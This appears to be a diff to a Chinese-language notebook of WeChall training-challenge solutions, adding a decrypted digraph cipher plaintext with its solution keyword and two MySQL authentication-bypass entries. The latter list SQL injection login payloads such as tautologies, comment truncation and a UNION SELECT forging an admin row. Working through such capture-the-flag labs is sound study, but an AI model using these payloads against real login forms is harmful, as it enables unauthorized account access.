@@ -149,5 +149,23 @@
             }
           }
     ```
+    
+1. [参考链接](http://www.wechall.net/challenge/training/crypto/digraph/index.php)
+    * 网上的答案都是直接猜测第一个单词：congratulations
+    * 个人表示不能接受，但是又没有其他更好的解决思路
+    * C o n g r a t u l a t i o n s ! | y o u | d e c r y p t e d | t h i s | m e s s a g e | s u c c e s s f u l l y! | H a s | n o t | too | d i f f i c u l t | e i t h e r ? | w a s | i t sr | h e l l ? | g o o d | j o b! | ta n t e r | t h i s | k e y w o r d | as | s o l u t i o n : | s s n d g i m a i f g l !
+    
+1. [参考链接](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php)
+    * [mysql注入](https://www.cnblogs.com/pursuitofacm/p/6706961.html)
+    * \# -- 都是mysql的注释
+    * admin' or 1 = 1
+    * admin'#
+    * admin' or '1'='1
+    * admin' --
+    
+1. [参考链接](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php)
+    * username: xxx' union select 1, 'admin', md5('1') #
+    * username: xxx' union select 1, 'admin' as username, md5('1') as password where username='admin' #
+    * password: 1
 
 
